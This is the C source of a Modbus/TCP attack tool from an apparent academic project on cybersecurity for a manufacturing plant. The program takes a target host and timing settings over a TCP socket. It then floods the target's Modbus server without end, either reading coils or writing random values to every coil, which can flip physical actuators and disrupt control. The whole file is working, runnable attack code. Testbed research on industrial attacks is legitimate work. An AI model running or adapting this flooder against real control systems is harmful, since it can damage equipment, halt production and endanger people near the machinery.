/*
 * Projeto: Desenvolvimento de uma arquitetura de cibersegurança para uma planta de manufatura avançada
 * Autor: Eduardo Lôbo Teixeira Filho
 * Ano: 2025
 * 
 * Desenvolvido com apoio da FAPESB (Edital 009/2024 - PIBIC/SENAI CIMATEC)
 *
 * Este programa é software livre: você pode redistribuí-lo e/ou modificá-lo
 * sob os termos da Licença Pública Geral GNU, conforme publicada pela Free Software Foundation,
 * na versão 3 da Licença, ou qualquer versão posterior.
 *
 * Este programa é distribuído na expectativa de que seja útil,
 * mas SEM QUALQUER GARANTIA; sem mesmo a garantia implícita de
 * COMERCIALIZAÇÃO ou ADEQUAÇÃO A UM DETERMINADO PROPÓSITO.
 * Veja a Licença Pública Geral GNU para mais detalhes.
 *
 * Você deve ter recebido uma cópia da Licença Pública Geral GNU
 * junto com este programa. Se não, veja <https://www.gnu.org/licenses/>.
 */

#define _POSIX_C_SOURCE 199309L
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <modbus.h>
#include <time.h>
#include <cjson/cJSON.h>
#include <errno.h>
#include <inttypes.h>
#include <fcntl.h>      
#include <sys/types.h>  
#include <sys/stat.h>   

#pragma pack(1)

#define ARRAY_LENGTH(arr) (sizeof(arr) / sizeof((arr)[0]))
#define TRUE 1
#define MAX_CONFIG_BUFFER_SIZE 65535
#define TARGET_HOST_MAXLEN 20
#define SERVER_BACKLOG 1
#define BIT_MASK 0x01

typedef enum {
    READ,
    WRITE
} OperationType;

typedef struct {
    char targetHost[TARGET_HOST_MAXLEN];
    uint64_t startTime;
    uint64_t floodingPeriod;
    uint32_t timeoutAtk;
    int delayBtwRequestsAtk;
    OperationType operation;
} Parametros;

int criar_socket_servidor(int porta);
int aceitar_cliente(int server_sock, struct sockaddr_in *client_addr);
void receber_pacote(int client_sock, Parametros *p);
uint64_t get_current_time_ms();
void ler_configuracao(int *porta_servidor, int *porta_modbus, int *coils);
void preencher_tab_reg_aleatorio(uint8_t *tab_reg, size_t tamanho);
void sleep_us(unsigned int microseconds);

int main() {
    int server_sock, client_sock, rslt, porta_servidor, porta_modbus, coils;
    struct sockaddr_in client_addr;
    Parametros recebido;
    modbus_t *ctx;

    ler_configuracao(&porta_servidor, &porta_modbus, &coils);

    uint8_t tab_reg[coils];
    uint64_t startExecTime = get_current_time_ms();

    server_sock = criar_socket_servidor(porta_servidor);
    client_sock = aceitar_cliente(server_sock, &client_addr);
    receber_pacote(client_sock, &recebido);

    close(client_sock);
    close(server_sock);

    printf("Iniciando ataque Modbus...\n");
    printf("  Host alvo: %s\n", recebido.targetHost);
    printf("  startTime: %" PRIu64 "\n", recebido.startTime);
    printf("  floodingPeriod: %" PRIu64 "\n", recebido.floodingPeriod);
    printf("  timeoutAtk: %u\n", recebido.timeoutAtk);
    printf("  delayBtwRequestsAtk: %d\n", recebido.delayBtwRequestsAtk);
    printf("  operation: %s\n", recebido.operation == READ ? "READ" : "WRITE");
    printf("  Porta Modbus: %d\n", porta_modbus);
    
    while(TRUE) {
        memset(tab_reg, 0, sizeof(tab_reg));

        ctx = modbus_new_tcp(recebido.targetHost, porta_modbus);
        if (ctx == NULL) {
            fprintf(stderr, "Erro ao criar contexto Modbus: %s\n", modbus_strerror(errno));
            sleep(1); 
            continue;
        }

        modbus_set_response_timeout(ctx, 0, recebido.timeoutAtk);

        sleep_us(recebido.startTime);
        if (modbus_connect(ctx) == -1) {
            fprintf(stderr, "Falha ao conectar: %s\n", modbus_strerror(errno));
            modbus_free(ctx);
            sleep(1); 
            continue;
        }
        printf("Conectado ao servidor Modbus %s na porta %d\n", recebido.targetHost, porta_modbus);

        while(get_current_time_ms() - startExecTime < recebido.startTime + recebido.floodingPeriod) {
            printf("Enviando pacote Modbus...\n");
            if(recebido.operation == READ){
                rslt = modbus_read_bits(ctx, 0, ARRAY_LENGTH(tab_reg), tab_reg);
                if(rslt == -1) {
                    fprintf(stderr, "Erro em modbus_read_bits: %s\n", modbus_strerror(errno));
                    break; 
                }
            }                
            else if(recebido.operation == WRITE){
                preencher_tab_reg_aleatorio(tab_reg, ARRAY_LENGTH(tab_reg));
                rslt = modbus_write_bits(ctx, 0, ARRAY_LENGTH(tab_reg), tab_reg);
                if(rslt == -1) {
                    fprintf(stderr, "Erro em modbus_write_bits: %s\n", modbus_strerror(errno));
                    break; 
                }
            }
            sleep_us(recebido.delayBtwRequestsAtk);
        }
        modbus_close(ctx);
        modbus_free(ctx);

    }
    return 0;
}

int criar_socket_servidor(int porta) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Erro ao criar socket do servidor");
        exit(EXIT_FAILURE);
    }

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(porta);
    server.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Erro no bind");
        close(sock);
        exit(EXIT_FAILURE);
    }

    if (listen(sock, SERVER_BACKLOG) < 0) {
        perror("Erro no listen");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("Servidor escutando na porta %d...\n", porta);
    return sock;
}

int aceitar_cliente(int server_sock, struct sockaddr_in *client_addr) {
    socklen_t c = sizeof(struct sockaddr_in);
    int client_sock = accept(server_sock, (struct sockaddr *)client_addr, &c);

    if (client_sock < 0) {
        perror("Erro no accept");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    char ip_cliente[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr->sin_addr), ip_cliente, INET_ADDRSTRLEN);
    printf("Cliente conectado: %s:%d\n", ip_cliente, ntohs(client_addr->sin_port));

    return client_sock;
}

void receber_pacote(int client_sock, Parametros *p) {
    ssize_t bytes_recebidos = recv(client_sock, p, sizeof(Parametros), 0);
    if (bytes_recebidos < 0) {
        perror("Erro ao receber struct");
        close(client_sock);
        exit(EXIT_FAILURE);
    } else if ((size_t)bytes_recebidos < sizeof(Parametros)) {
        fprintf(stderr, "Aviso: struct recebida parcialmente (%zd de %zu bytes)\n",
                bytes_recebidos, sizeof(Parametros));
    } else {
        printf("Struct recebida com sucesso.\n");
    }
}

uint64_t get_current_time_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)(ts.tv_sec) * 1000 + (ts.tv_nsec / 1000000);
}

void preencher_tab_reg_aleatorio(uint8_t *tab_reg, size_t tamanho) {
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
        perror("Erro ao abrir /dev/urandom");
        // fallback para rand()
        for (size_t i = 0; i < tamanho; i++) {
            tab_reg[i] = rand() % 2;
        }
        return;
    }
    ssize_t lidos = read(fd, tab_reg, tamanho);
    if (lidos < 0) {
        perror("Erro ao ler /dev/urandom");
        // fallback para rand()
        for (size_t i = 0; i < tamanho; i++) {
            tab_reg[i] = rand() % 2;
        }
        close(fd);
        return;
    }
    for (size_t i = 0; i < tamanho; i++) {
        tab_reg[i] = tab_reg[i] & BIT_MASK;
    }
    close(fd);
}

void sleep_us(unsigned int microseconds) {
    struct timespec ts;
    ts.tv_sec = microseconds / 1000000;
    ts.tv_nsec = (microseconds % 1000000) * 1000;
    while (nanosleep(&ts, &ts) == -1 && errno == EINTR) {
        // Se for interrompido por sinal, continua dormindo o tempo restante
        continue;
    }
}

void ler_configuracao(int *porta_servidor, int *porta_modbus, int *coils) {
    FILE *file = fopen("../configs/attacker.json", "r");
    if (!file) {
        perror("Erro ao abrir o arquivo de configuração");
        exit(EXIT_FAILURE);
    }

    char buffer[MAX_CONFIG_BUFFER_SIZE];
    size_t bytes_lidos = fread(buffer, 1, sizeof(buffer) - 1, file);
    if (bytes_lidos == 0) {
        fprintf(stderr, "Erro ao ler o arquivo de configuração ou arquivo vazio\n");
        fclose(file);
        exit(EXIT_FAILURE);
    }
    buffer[bytes_lidos] = '\0';
    fclose(file);

    cJSON *json = cJSON_Parse(buffer);
    if (!json) {
        fprintf(stderr, "Erro ao analisar JSON: %s\n", cJSON_GetErrorPtr());
        exit(EXIT_FAILURE);
    }

    cJSON *config = cJSON_GetObjectItem(json, "config");
    if (!config) {
        fprintf(stderr, "Configuração não encontrada no JSON\n");
        cJSON_Delete(json);
        exit(EXIT_FAILURE);
    }

    cJSON *portaServidor = cJSON_GetObjectItem(config, "portaServidor");
    cJSON *portaModbus = cJSON_GetObjectItem(config, "portaModbus");
    cJSON *coilsItem = cJSON_GetObjectItem(config, "coils");
    if (!portaServidor || !portaModbus || !coilsItem) {
        fprintf(stderr, "Campos portaServidor, portaModbus ou coils ausentes no JSON\n");
        cJSON_Delete(json);
        exit(EXIT_FAILURE);
    }

    *porta_servidor = portaServidor->valueint;
    *porta_modbus = portaModbus->valueint;
    *coils = coilsItem->valueint;

    cJSON_Delete(json);
}